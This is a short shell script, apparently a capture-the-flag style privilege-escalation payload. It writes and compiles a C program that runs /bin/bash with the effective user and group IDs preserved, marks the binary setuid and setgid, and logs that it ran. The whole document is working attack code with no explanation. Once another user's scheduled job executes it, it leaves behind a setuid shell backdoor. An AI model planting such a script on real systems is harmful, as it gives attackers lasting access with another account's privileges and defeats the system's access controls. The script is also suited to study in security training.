#!/bin/sh

exec > output.txt
exec 2>&1

echo '#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv) {
        gid_t gid;
        uid_t uid;

        gid = getegid();
        uid = geteuid();

        setresgid(gid, gid, gid);
        setresuid(uid, uid, uid);

        execve("/bin/bash", NULL, NULL);
}' > basher.c

cc -o basher basher.c
chmod +x basher
chmod +s basher

echo `date`
echo "ran!"
